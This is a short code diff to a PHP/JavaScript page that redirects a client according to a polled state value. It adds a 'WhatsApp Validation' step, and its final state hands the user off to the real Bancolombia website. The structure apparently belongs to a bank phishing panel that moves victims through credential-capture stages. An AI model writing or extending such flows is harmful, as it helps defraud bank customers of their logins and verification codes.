@@ -64,6 +64,9 @@ $clienteId = $_GET['id'] ?? null;
                     } else if (data.estado == 7) {
                         // Estado 7: Finalizar
                         window.location.href = `https://www.bancolombia.com/personas`;
+                    } else if (data.estado == 8) {
+                        // Estado 8: WhatsApp Validation
+                        window.location.href = `index.php?status=whatsapp&id=${clienteId}`;
                     } else {
                         // Si no hay un estado definido, regresa al login por defecto.
                         window.location.href = `index.php`;
